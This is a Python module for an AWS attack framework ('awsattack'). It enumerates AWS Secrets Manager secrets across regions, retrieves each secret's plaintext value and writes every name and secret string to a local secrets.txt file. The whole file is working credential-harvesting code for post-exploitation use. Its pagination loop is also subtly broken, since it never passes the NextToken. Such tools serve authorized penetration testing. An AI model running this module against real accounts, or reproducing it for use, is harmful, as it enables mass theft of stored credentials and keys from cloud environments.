#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
import os


def main(args, awsattack_main):
    session = awsattack_main.get_active_session()

    print = awsattack_main.print
    get_regions = awsattack_main.get_regions

    summary_data = {"SecretsManager": 0}

    if args.regions is None:
        regions = get_regions('secretsmanager')
        if regions is None or regions == [] or regions == '' or regions == {}:
            print('This module is not supported in any regions specified in the current sessions region set. Exiting...')
            return None
    else:
        regions = args.regions.split(',')

    all_secrets_ids_sm = []

    if not os.path.exists('./sessions/{}/downloads/secrets/secrets_manager'.format(session.name)):
        os.makedirs('./sessions/{}/downloads/secrets/secrets_manager'.format(session.name))


    for region in regions:
        secret_ids = []

        print('Starting region {}...'.format(region))
        client = awsattack_main.get_boto3_client('secretsmanager', region)
        
        response = None
        next_token = False
        while (response is None) or 'NextToken' in response:
            if next_token is False:
                try:
                    response = client.list_secrets()
                except ClientError as error:
                    code = error.response['Error']['Code']
                    print('FAILURE: ')
                    if code == 'UnauthorizedOperation':
                        print('  Access denied to ListSecrets.')
                    else:
                        print('  ' + code)
                    print('    Could not list secrets... Exiting')
                    return None
                    
            else:
                response = client.list_secrets()

            for secret in response['SecretList']:
                secret_ids.append({"name":secret["Name"],"region":region})

        all_secrets_ids_sm += secret_ids


    for sec in all_secrets_ids_sm:
        secret_values = []
        client = awsattack_main.get_boto3_client('secretsmanager',sec["region"])

        response = None
        while response is None:
            try:
                response = client.get_secret_value(
                SecretId=sec["name"]
                )
            except ClientError as error:
                code = error.response['Error']['Code']
                print('FAILURE: ')
                if code == 'UnauthorizedOperation':
                    print('  Access denied to GetSecretsValue.')
                else:
                    print(' ' + code)
                print('    Could not get secrets value... Exiting')
                return None

        with open('./sessions/{}/downloads/secrets/secrets_manager/secrets.txt'.format(session.name),'a') as f:
            f.write("{}:{}\n".format(sec["name"], response["SecretString"]))


            
    summary_data["SecretsManager"] = len(all_secrets_ids_sm)

    # Make sure your main function returns whatever data you need to construct
    # a module summary string.
    return summary_data


